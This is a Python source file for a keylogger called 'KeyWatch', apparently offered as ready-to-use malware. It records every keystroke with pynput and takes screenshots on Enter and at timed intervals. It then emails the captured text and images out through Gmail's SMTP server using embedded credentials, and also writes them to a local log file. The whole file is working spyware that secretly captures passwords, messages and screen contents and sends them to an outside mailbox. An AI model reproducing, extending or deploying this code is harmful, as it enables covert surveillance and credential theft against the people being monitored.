from pynput.keyboard import Listener
from time import sleep
import threading
import smtplib 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
from datetime import datetime
from pynput.keyboard import Key
import mss

###  Project: KeyWatch – Advanced Keystroke Logger

class Kelogger:
  def __init__(self, time_interval, email, password, LOG_FILE_PATH):
    # self.log: a variable to store everything that the user writes (temporary registration).
    self.log = "" 
    self.interval = time_interval
    self.email = email
    self.password = password
    self.start_time = datetime.now()
    self.LOG_FILE_PATH = LOG_FILE_PATH

  def process_key_press(self, key):
      """Process each key press and add to log."""
      try:
          self.log += str(key.char)
      except AttributeError:
          if key == Key.space:
              self.log += " "
          elif key == Key.enter:
              self.log += "\n"
              self.take_screenshot()
          elif key == Key.tab:
              self.log += "\t"
          else:
              self.log += f" [{key.name}] "

  def take_screenshot(self):
        """Take screenshot and save with timestamp."""
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f"screenshot_{timestamp}.png"
        try:
            with mss.mss() as sct:
                sct.shot(output=filename)
                print(f"[+] Screenshot taken: {filename}")
        except Exception as e:
            print(f"[!] Failed to take screenshot: {e}")
        return filename

  def report(self):
    if len(self.log) > 0:
      timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
      formatted_log = f"\n[+] Log Time: {timestamp}\n{'-'*40}\n{self.log}\n{'='*40}\n"

      # Take Screenshot
      screenshot_file = self.take_screenshot()


      # Send via email
      self.send_mail(self.email, self.password, formatted_log, screenshot_file)

      # View in Terminal
      print(formatted_log)

      # (optional) Save to local file
      with open(self.LOG_FILE_PATH, "a", encoding="utf-8") as f:
        f.write(formatted_log)
      

    #  Full-time log.
    self.log = ""
    threading.Timer(self.interval, self.report).start() 

  def send_mail(self, email, password, message, attachment_path=None):
      """Send logs via email with optional screenshot attachment."""
      try:
          # Message preparation
          msg = MIMEMultipart()
          msg['From'] = email
          msg['To'] = email
          msg['Subject'] = f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"

          # Add Text
          msg.attach(MIMEText(message, 'plain'))

          # Add attachment (image)
          if attachment_path and os.path.isfile(attachment_path):
              with open(attachment_path, 'rb') as attachment:
                  part = MIMEBase('application', 'octet-stream')
                  part.set_payload(attachment.read())
                  encoders.encode_base64(part)
                  part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
                  msg.attach(part)

          # Send Message
          server = smtplib.SMTP('smtp.gmail.com', 587)
          server.starttls()
          server.login(email, password)
          server.send_message(msg)
          server.quit()

          print(f"[+] Email sent successfully with attachment: {attachment_path}")

      except Exception as e:
          print(f"[!] Failed to send email: {e}")

  def start(self):
      # Create a listener that monitors keystrokes
      keyboard_listen = Listener(on_press=self.process_key_press)
      # Run the listener and wait for the clicks
      with keyboard_listen:
          self.report()
          keyboard_listen.join() # Wait for the listener to finish listening 

